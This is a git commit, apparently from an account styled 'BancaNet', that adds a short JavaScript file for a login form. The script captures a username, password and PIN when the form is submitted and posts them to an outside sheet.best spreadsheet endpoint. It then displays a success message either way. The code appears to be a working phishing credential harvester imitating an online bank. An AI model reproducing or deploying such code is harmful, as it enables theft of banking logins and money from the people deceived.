2931ec73e853d4f74bd002e756707affc7a8c14b
BancaNet <118473613+BancaNet@users.noreply.github.com>
2022-11-17 13:08:16 -0600

    add files
    add

---
+++ js/app.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('formulario');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/c60a9a8a-1ca5-4622-9f22-e7c5e52a57bd', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.usuario.value,
+            "Contraseña1": formulario.contraseña.value,
+            "Contraseña2": formulario.nip.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
